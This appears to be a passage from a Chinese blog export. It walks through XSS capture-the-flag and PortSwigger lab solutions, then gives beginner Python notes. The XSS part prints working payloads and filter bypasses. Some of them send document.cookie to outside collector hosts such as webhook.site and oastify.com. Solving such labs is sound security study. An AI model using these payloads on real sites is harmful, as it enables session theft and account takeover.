level-3$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;

payload：&#39;onclick=&#39;alert(1)r然后再点击一下输入框就成功了
&lt;input name=keyword  value=&#x27;&#x27;onclick=&#x27;alert(1)&#x27;&gt;

level-4$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;

payload：&quot;onclick=&quot;alert(1)
level-5$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;

payload：&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;，利用浏览器自动校正轻微语法错误
level-6$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;

该题有多种payload，基本上只要把前几题改下大小写就可以了
level-7$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;rcs&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;

全转换成小写了，大小写不管用，但是可以双写绕过：&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;
level-8（HTML实体绕过）$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;

可以用HTML实体来绕过过滤: &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;
HTML实体：字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读
level-9（http）$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);if(false===strpos($str7,&#x27;http://&#x27;))&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;else&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;

在上题的基础上再添上 //http://就可以了
&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://

level-10$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;

当一个input元素里面有两个type时，那么只有第一个 type 属性会被浏览器解析，而第二个 type 属性会被忽略
payload：t_sort=&quot;type=&quot;text&quot;onclick=&quot;alert(1)
level-11$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;

在referer里面进行修改就行：&quot;type=&quot;text&quot;onclick=&quot;alert(1)
level-12和上题不同的是要在User-Agent里面改
level-13这题在cookie里面改就可以了
&quot;type=&quot;text&quot;onclick=&quot;alert(1)或者&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)

level-14考到了杂项，不会
level-15（文件包含）&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;?&gt;

ng-include指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。
ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下
所以这题我们只需要包含第一题的漏洞就好了：src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;
level-16（替换空格）$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot; &quot;,$str);$str3=str_replace(&quot; &quot;,&quot; &quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot; &quot;,$str3);$str5=str_replace(&quot;	&quot;,&quot; &quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;

1、“0D”是把光标移到同一行的顶头——回车(CR)。
2、“0A”是把光标移到下一行——换行(LF)。
3、用“&#x2F;”代替空格
使用替身，就是将%0a或者%0D当成空格使用，在HTML中这样是合法的
payload：&lt;img%0dsrc=1%0donerror=alert(1)&gt;
CTF.showweb316-web319除了316外后面几题过滤了 &lt;javascript&gt;，所以解题如下：
&lt;body onload=&quot;window.open(&#x27;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=&#x27;+document.cookie)&quot;&gt;

web320-web326可以通过在输入框输入一串字符（比如：我输入了script），然后查看回显，有回显说明没有被过滤掉，无回显说明被过滤掉了
web320:
通过查看网址发现空格被替换成了加号，过滤了空格，可以用&#x2F;或者&#x2F;**&#x2F;来代替空格，所以解题如下：
&lt;body onload=&quot;window.open(&#x27;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=&#x27;+document.cookie)&quot;&gt;

后面几题都可以用上述的方法
web327发信人必须是admin，然后信的内容是xss的内容就好了
CTFHub-XSS反射型
该题没有任何过滤，最开始我只在第一行里面构造xss，payload如下：
&lt;script&gt;window.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$&#123;document.cookie&#125;`&lt;/script&gt;

提交之后确实会访问该网站但是查bp的时候发现没有任何的cookie，后面再看眼页面发现需要利用第二行发送一个url给Bot，所以如下：
http://challenge-fe994fbb8a6a0602.sandbox.ctfhub.com:10800/?name=&lt;script&gt;window.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$&#123;document.cookie&#125;`&lt;/script&gt;

发送后在bp查看获取flag
过滤空格只要空格变为 /**/就好啦
bp实验室Lab: DOM XSS in innerHTML sink using source location.search本实验在搜索博客功能中包含一个基于 DOM 的跨站点脚本漏洞。它使用赋 innerHTML 值，该赋值使用来自 location.search 的数据更改 div 元素的 HTML 内容
最开始在搜索框中输入 &lt;script&gt;alert(1)&lt;/script&gt;的时候，并没有成功执行，通过hackbar查看元素的时候发现该行代码成功注入，但是没有执行（后面看解析视频的时候说是因为同步的问题，浏览器的自我保护机制）
于是我们再思考思考有什么是可以被执行的，即img元素，我们运用的也仅仅是一个报错罢了，所以尝试在输入框内输入 &lt;img src=1 onerror=alert(1)&gt;，点击发送，页面成功回显alert，于是通过这个方法我们也可以执行任意的js代码来达到我们的目的
Lab: DOM XSS in jQuery anchor href attribute sink using location.search source该题先是尝试了在评论区里面评论以及提交反馈处xss，但是都失败了，后面查看了一下提交反馈界面的源码，发现了以下代码：
&lt;script&gt;	$(function() &#123;    	$(&#x27;#backLink&#x27;).attr(&quot;href&quot;, (new URLSearchParams(window.location.search)).get(&#x27;returnPath&#x27;));	&#125;);&lt;/script&gt;


$(function() &#123; ... &#125;): 这是jQuery中的一种文档就绪函数，即在DOM加载完成后执行其中的代码。它等价于JavaScript中的document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123; ... &#125;)。
$(&#39;#backLink&#39;): 这是jQuery选择器，用于选取id为”backLink”的元素。
.attr(&quot;href&quot;, ...): 这是jQuery中用于设置元素属性的方法。在这里，它设置了id为”backLink”的元素的href属性。
(new URLSearchParams(window.location.search)).get(&#39;returnPath&#39;): 这一部分使用了JavaScript中的URLSearchParams对象来获取当前页面URL中查询参数”returnPath”的值。首先，通过window.location.search获取当前页面URL的查询参数部分，然后使用URLSearchParams对象来解析这个查询参数字符串，最后调用.get(&#39;returnPath&#39;)方法获取名为”returnPath”的参数的值。

看到网址处：https://0aa3002e043a24f88b20e4c8006c0026.web-security-academy.net/feedback?returnPath=/尝试性在后面输入 abc123，检查back按键发现输入内容已经进入了href后面，如下：

于是我们把输入的内容改为：javascript:alert(document.cookie)，然后再点击back按键，解决问题
Lab: DOM XSS in jQuery selector sink using a hashchange event要求：要解决该实验室问题，请向受害者提供一个漏洞利用程序，在其浏览器中调用 print() 函数
进入实验室，查看源代码，js代码如下：
 $(window).on(&#x27;hashchange&#x27;, function()&#123;	var post = $(&#x27;section.blog-list h2:contains(&#x27; + decodeURIComponent(window.location.hash.slice(1)) + &#x27;)&#x27;);	if (post) post.get(0).scrollIntoView();&#125;);

这段代码是用jQuery编写的，监听浏览器URL中哈希值（#后面的部分）的变化，当哈希值发生变化时，它会查找页面上带有特定标题的元素，并将页面滚动到该元素位置。
具体来说：

$(window).on(&#39;hashchange&#39;, function()&#123;...&#125;);：这一行代码是当浏览器URL的哈希值发生变化时触发的事件处理程序。
var post = $(&#39;section.blog-list h2:contains(&#39; + decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;);：这一行代码是查找页面上包含特定标题的元素。它首先解码哈希值（由decodeURIComponent()函数完成），然后使用选择器section.blog-list h2:contains(...)查找带有指定标题的&lt;h2&gt;元素。查找结果将被存储在变量post中。
if (post) post.get(0).scrollIntoView();：这一行代码是将页面滚动到包含特定标题的元素处。它首先检查是否找到了符合条件的元素（通过检查post变量是否存在），如果找到了，则使用scrollIntoView()方法将其滚动到可见区域。

这段代码的功能是让页面在加载后根据URL中的哈希值自动滚动到对应标题的部分
页面源码中的h2元素就是文章的标题
网上找到的关于此函数的相关漏洞链接：https://bugs.jquery.com/ticket/9521/
发现了有意思的地方如下：
&quot;$(location.hash)&quot; expected CSS selector in many case, but this code also can create html element.“$(location.hash)”在很多情况下都需要 CSS 选择器，但此代码也可以创建 html 元素。

上面的意思就是说如果未找到css选择器中要查找的元素，那么会自动创建html元素
这样子的话我们可以直接在#后面加上js代码：https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#&lt;img src=x onerror=print()&gt;，点击回车会有弹窗出现，但是只能够触发一次，下一次就失败，无法访问网站，所以直接把该链接给受害者的办法是行不通的，需要换一种思路：首先加载https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#，然后我们再把payload加载到该url中，这样便可以触发一次哈希更改事件
所以我们在bp提供的漏洞利用程序中的body部分可以这样写到：
&lt;iframe src=&quot;https://YOUR-LAB-ID.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=x onerror=print()&gt;&#x27;&quot;&gt;&lt;/iframe&gt;

测试该漏洞成功，把它发给受害者，题目解决
Lab：将 XSS 反射到带有尖括号 HTML 编码的属性中要求：此实验室在搜索博客功能中包含一个反映的跨站点脚本漏洞，其中尖括号是 HTML 编码的。要完成此实验，请执行跨站点脚本攻击，注入属性并调用 alert 函数
在搜索框处随机输入一串字符，然后检查元素，如下：
&lt;input type=&quot;text&quot; placeholder=&quot;Search the blog...&quot; name=&quot;search&quot; value=&quot;ilbxoiusagxui&quot;&gt;

于是我们可以尝试逃出双引号，首先尝试输入：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;，失败，检查元素，发现特殊符号被转化为HTML实体，
接着尝试：&quot;onload=&quot;alert(1)，失败，没有弹窗
接着尝试另一种方法：&quot;onmouseover=&quot;alert(1)，鼠标经过相关元素，弹窗成功，题目解决
Lab：将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中要求：该实验在评论功能中包含一个存储的跨站点脚本漏洞。要完成此实验，请提交一条评论，该评论在单击评论作者姓名时调用 alert 函数
随便点进一篇文章，先随便提交一条评论，接着返回查看评论，如下：

点击评论者名字的话会自动跳转到你输入进去的网址
所以我们有了思路，在写评论中让你输入网址的地方利用js伪协议，输入：javascript:alert(1)，提交评论，题目解决
（url的组成是协议加上地址，所以我们用js伪协议可以成功）
Lab：将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中要求：此实验室在尖括号编码的搜索查询跟踪功能中包含反映的跨站点脚本漏洞。反射发生在 JavaScript 字符串内。要完成本实验，请执行跨站点脚本攻击，突破 JavaScript 字符串并调用 alert 函数
在搜索栏中搜索文章名字后，右键检查元素，发现了相关的js代码如下：
&lt;script&gt;var searchTerms = &#x27;125&#x27;;document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;);&lt;/script&gt;

最开始的思路被题目带歪了，一直在思考着怎么突破下面的双引号包括，当然最终的尝试以失败告终
然后就没有思路，开始看下面的讲解视频，发现他是突破上面变量searchTerms的单引号包括，恍然大悟
进行尝试：&#39;;alert(1);&#39;尝试失败，但是成功逃脱了单引号包括，要解决的就是后面遗留的&#39;;
所以我们可以自己再创造一个变量出来解决这个问题：&#39;;alert(1);let word=&#39;
题目解决
不得不说思路得扩大一点，不能只局限于一处，要多看看其他地方有没有可以突破的地方
Lab： document.write 接收器中的 DOM XSS 使用选择元素内的源 location.search要求：此实验室在股票检查器功能中包含基于 DOM 的跨站点脚本漏洞。它使用 JavaScript document.write 函数，将数据写入页面。 document.write 函数使用来自 location.search 的数据进行调用，您可以使用网站 URL 进行控制。数据包含在选择元素内。要完成此实验，请执行跨站点脚本攻击，该攻击会突破 select 元素并调用 alert 函数
相关的js代码如下：
&lt;script&gt;var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];var store = (new URLSearchParams(window.location.search)).get(&#x27;storeId&#x27;);document.write(&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;);if(store) &#123;	document.write(&#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;);&#125;for(var i=0;i&lt;stores.length;i++) &#123;	if(stores[i] === store) &#123;		continue;	&#125;	document.write(&#x27;&lt;option&gt;&#x27;+stores[i]+&#x27;&lt;/option&gt;&#x27;);&#125;document.write(&#x27;&lt;/select&gt;&#x27;);&lt;/script&gt;

这段 JavaScript 代码创建了一个 &lt;select&gt; 元素，其中包含了一组商店名称作为选项。它还根据 URL 查询参数中的 storeId 值选择了一个默认选项。
让我们逐行解释代码的功能：

var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];：定义了一个包含商店名称的数组。
var store = (new URLSearchParams(window.location.search)).get(&#39;storeId&#39;);：使用 URLSearchParams 获取了当前页面 URL 查询参数中名为 storeId 的值，并将其存储在 store 变量中。
document.write(&#39;&lt;select name=&quot;storeId&quot;&gt;&#39;);：使用 document.write() 方法输出了一个 &lt;select&gt; 元素的开始标签。
if (store) &#123; ... &#125;：检查是否存在 storeId 参数。如果存在，就在 &lt;select&gt; 中添加一个被选中的选项，显示当前的 storeId 值。
for (var i = 0; i &lt; stores.length; i++) &#123; ... &#125;：遍历商店数组，对每个商店创建一个 &lt;option&gt; 元素，并将其添加到 &lt;select&gt; 中。
document.write(&#39;&lt;/select&gt;&#39;);：输出 &lt;select&gt; 元素的结束标签。

通过这段代码，你可以在页面上创建一个下拉菜单，其中包含了预定义的商店选项，并且可以根据 URL 中的 storeId 参数自动选择默认选项
于是我们尝试在url中添加参数：https://0a9a006303a2363184429b37009500d5.web-security-academy.net/product?productId=1&amp;storeId=sherlock，然后回车，检查元素，变化如下：
&lt;select name=&quot;storeId&quot;&gt;	&lt;option selected=&quot;&quot;&gt;sherlock&lt;/option&gt;	&lt;option&gt;London&lt;/option&gt;	&lt;option&gt;Paris&lt;/option&gt;	&lt;option&gt;Milan&lt;/option&gt;&lt;/select&gt;

题目告诉我们说要突破select标签，所以我们可以让它提前闭合，payload如下：
storeId=sherlock&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=alert(1)&gt;后面未闭合的标签我们不需要去管，浏览器会自动修复，回车后如下
&lt;select name=&quot;storeId&quot;&gt;	&lt;option selected=&quot;&quot;&gt;sherlock&lt;/option&gt;&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;&lt;option&gt;London&lt;/option&gt;&lt;option&gt;Paris&lt;/option&gt;&lt;option&gt;Milan&lt;/option&gt;

题目解决
Lab：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码该实验在搜索功能中的 AngularJS 表达式中包含基于 DOM 的跨站点脚本漏洞。AngularJS 是一个流行的 JavaScript 库，它扫描包含 ng-app 属性（也称为 AngularJS 指令）的 HTML 节点的内容。当指令添加到 HTML 代码中时，您可以执行双花括号内的 JavaScript 表达式。当对尖括号进行编码时，此技术非常有用。要完成此实验，请执行跨站点脚本攻击，该攻击执行 AngularJS 表达式并调用 alert 函数

根据题目提供的相关描述，在谷歌上面进行搜索，得到了一篇相关的非常有用的文章：https://nosec.org/home/detail/4153.html
由于尖括号被编码了，所以我们不能使用相关特殊字符，便尝试用双花括号
首先输入&#123;&#123;1+1&#125;&#125;：输出为2，表明应用很容易受到客户端模板注入的影响
默认情况下，作用域对象包含另一个名为“构造器”的对象，该对象包含一个也被称为“构造器”的函数。此函数可用于动态生成和执行代码。而这正是我们执行XSS的payload所需要的
所以构造payload为：&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;
题目解决
Lab：反射型 DOM XSS本实验演示了反射 DOM 漏洞。当服务器端应用程序处理请求中的数据并在响应中回显数据时，就会出现反射 DOM 漏洞。然后，页面上的脚本以不安全的方式处理反射的数据，最终将其写入危险的接收器。要完成本实验，请创建一个调用 alert() 函数的注入
先打开burpsuite，进入实验室后打开proxy，然后在搜索框中随便输入字符串（比如xss），到bp的代理的url历史中找到/search-results?search=xss，把它发送到repeater中，该条目具体内容如下：

我们可以尝试突破双引号包括，即xss&quot;-alert(1)&#125;//，发现行不通，双引号会自动被转义，于是我们可以自己先给它加个转义，而转义符也是可以被转义的，这样子我们就可以突破双引号了，payload为：xss\&quot;-alert(1)&#125;//，如下：

成功逃脱，弹窗成功，题目解决
payload中-的作用：- 后面的内容 alert(1) 是一个 JavaScript 代码片段，它尝试执行一个弹窗警告框。然而，在这种情况下，这段代码被包含在双引号 &quot; 中，并且在外面包裹了反斜杠 \。这样做是为了避免 JSON 格式出错，因为双引号和反斜杠都是 JSON 字符串中的特殊字符，需要进行转义处理。
总之，- 的作用是对搜索条件进行逻辑操作，而这个搜索条件中包含了一个被排除的 JavaScript 代码片段
Lab：存储的 DOM XSS按照上一题的思路来做，同样的评论部分都为json文件，观察到name位于最后的位置，于是按照上题在name输入框可以这样写：xss\&quot;-alert(1)&#125;]//，回车之后发现并没有奏效
检查响应，发现给\&quot;分别都做了转义处理，于是失败了
查看题解，payload是写在评论的内容中：&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;，回车后点返回到博文，成功弹窗，题目解决
根据题解所说，这样子之所以可以奏效是因为为了防止 XSS，该网站使用 JavaScript replace() 函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一个匹配项。我们利用此漏洞只需在评论的开头添加一组额外的尖括号即可。这些尖括号将被编码，但任何后续的尖括号都不会受到影响，使我们能够有效地绕过过滤器并注入 HTML
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>python笔记</title>
    <url>/2024/01/15/python_max/python%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[python基础数据类型转换int() 强制转换为整型
float() 强制转换为浮点型
str() 强制转换为字符串类型
x = str(&quot;s1&quot;) # x 输出结果为 &#x27;s1&#x27;y = str(2)    # y 输出结果为 &#x27;2&#x27;z = str(3.0)  # z 输出结果为 &#x27;3.0&#x27;

整型和字符串类型进行运算，就可以用强制类型转换来完成
num_int = 123num_str = &quot;456&quot;print(&quot;num_int 数据类型为:&quot;,type(num_int))print(&quot;类型转换前，num_str 数据类型为:&quot;,type(num_str))num_str = int(num_str)    # 强制转换为整型print(&quot;类型转换后，num_str 数据类型为:&quot;,type(num_str))num_sum = num_int + num_strprint(&quot;num_int 与 num_str 相加结果为:&quot;,num_sum)print(&quot;sum 数据类型为:&quot;,type(num_sum))

运算符python位运算符
按位运算符是把数字看作二进制来进行计算的
假设a&#x3D;60,b&#x3D;13二进制格式为：a &#x3D; 0011 1100；b &#x3D; 0000 1101



运算符
描述
实测



&amp;
按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0
(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100


|
按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1
(a|b)输出结果 61 ，二进制解释： 0011 1101


^
按位异或运算符：当两对应的二进位相异时，结果为1
(a ^ b) 输出结果 49 ，二进制解释： 0011 0001


~
按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。**~x** 类似于 -x-1
(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。


&lt;&lt;
左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。
a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000


&gt;&gt;
右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数
a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111


逻辑运算符
a&#x3D;10,b&#x3D;20



运算符
逻辑表达式
描述
实例



and
x and y
布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值
(a and b) 返回 20。


or
x or y
布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。
(a or b) 返回 10。


not
not x
布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。
not(a and b) 返回 False


成员运算符



运算符
描述
实例



in
如果在指定的序列中找到值返回 True，否则返回 False
x 在 y 序列中 , 如果 x 在 y 序列中返回 True


not in
如果在指定的序列中没有找到值返回 True，否则返回 False
x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True


a = 10b = 20list = [1, 2, 3, 4, 5 ]if ( a in list ):   print (&quot;1 - 变量 a 在给定的列表中 list 中&quot;)else:   print (&quot;1 - 变量 a 不在给定的列表中 list 中&quot;)if ( b not in list ):   print (&quot;2 - 变量 b 不在给定的列表中 list 中&quot;)else:   print (&quot;2 - 变量 b 在给定的列表中 list 中&quot;)

身份运算符
身份运算符用于比较两个对象的存储单元(就是地址)



运算符
描述
实例



is
is 是判断两个标识符是不是引用自一个对象
x is y, 类似 id(x) &#x3D;&#x3D; id(y) , 如果引用的是同一个对象则返回 True，否则返回 False


is not
is not 是判断两个标识符是不是引用自不同对象
x is not y ， 类似 **id(x) !&#x3D; id(y)**。如果引用的不是同一个对象则返回结果 True，否则返回 False


id()函数用于获取对象内存地址
数字数学函数
相关函数
随机数函数
相关函数
三角函数
相关函数
数学常量



常量
描述



pi
数学常量 pi（圆周率，一般以π来表示）


e
数学常量 e，e即自然常数（自然常数）


字符串python中访问子字符串，可以使用方括号 []来截取字符串，格式为：变量[头下标:尾下标]；索引值索引值以 0 为开始值，**-1** 为从末尾的开始位置
（注意：截取的字符串内容不包括尾下标；切片的规则是始终从左到右进行）

var1 = &#x27;Hello World!&#x27;var2 = &quot;Runoob&quot; print (&quot;var1[0]: &quot;, var1[0])print (&quot;var2[1:5]: &quot;, var2[1:5])执行结果如下：var1[0]:  Hvar2[1:5]:  unoo

也可以截取字符串的一部分并与其他字段拼接
var1 = &#x27;Hello World!&#x27;print (&quot;已更新字符串 : &quot;, var1[:6] + &#x27;Runoob!&#x27;)

转义字符
相关字符表格 
三引号
python三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符
para_str = &quot;&quot;&quot;这是一个多行字符串的实例多行字符串可以使用制表符TAB ( \t )。也可以使用换行符 [ \n ]。&quot;&quot;&quot;print (para_str)

字符串内建函数
好多，具体见下面链接
链接
f-string
f-string 格式化字符串以 f 开头，后面跟着字符串，字符串中的表达式用大括号 {} 包起来，它会将变量或表达式计算后的值替换进去
&gt;&gt;&gt; name = &#x27;Runoob&#x27;&gt;&gt;&gt; f&#x27;Hello &#123;name&#125;&#x27;  # 替换变量&#x27;Hello Runoob&#x27;&gt;&gt;&gt; f&#x27;&#123;1+2&#125;&#x27;         # 使用表达式&#x27;3&#x27;&gt;&gt;&gt; w = &#123;&#x27;name&#x27;: &#x27;Runoob&#x27;, &#x27;url&#x27;: &#x27;www.runoob.com&#x27;&#125;&gt;&gt;&gt; f&#x27;&#123;w[&quot;name&quot;]&#125;: &#123;w[&quot;url&quot;]&#125;&#x27;&#x27;Runoob: www.runoob.com&#x27;

这种方法更简单，不用判断用%s还是，%d。
列表可以使用 append() 方法来添加列表项
list1 = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, &#x27;Taobao&#x27;]list1.append(&#x27;Baidu&#x27;)print (&quot;更新后的列表 : &quot;, list1)

可以使用 del 语句来删除列表中的元素
list = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000] print (&quot;原始列表 : &quot;, list)del list[2]print (&quot;删除第三个元素 : &quot;, list)

列表脚本操作符
列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表



Python 表达式
结果
描述



len([1, 2, 3])
3
长度


[1, 2, 3] + [4, 5, 6]
[1, 2, 3, 4, 5, 6]
组合


[‘Hi!’] * 4
[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]
重复


3 in [1, 2, 3]
True
元素是否存在于列表中


